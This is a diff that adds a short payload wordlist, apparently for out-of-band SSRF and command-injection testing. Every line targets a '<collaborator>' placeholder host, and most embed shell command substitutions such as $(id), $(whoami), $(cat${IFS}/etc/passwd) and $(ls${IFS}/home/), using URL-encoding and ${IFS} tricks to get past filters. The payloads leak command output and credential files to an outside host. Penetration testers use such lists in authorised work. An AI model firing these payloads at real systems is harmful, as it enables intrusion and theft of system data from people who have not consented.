@@ -1,0 +1,15 @@
+https://<collaborator>
+https://<collaborator>:22
+https://<collaborator>:25
+http://<collaborator>/id``
+http://<collaborator>/$(id)
+http://<collaborator>/whoami``
+http://<collaborator>/$(whoami)
+http://<collaborator>/uname -a``
+http://<collaborator>/$(uname -a)
+http://<collaborator>/%24(id)
+http://<collaborator>/%24(whoami)
+http://<collaborator>/cat${IFS}/etc/passwd``
+http://<collaborator>/$(cat${IFS}/etc/passwd)
+http://<collaborator>/$(hostname)
+http://<collaborator>/$(ls${IFS}/home/)
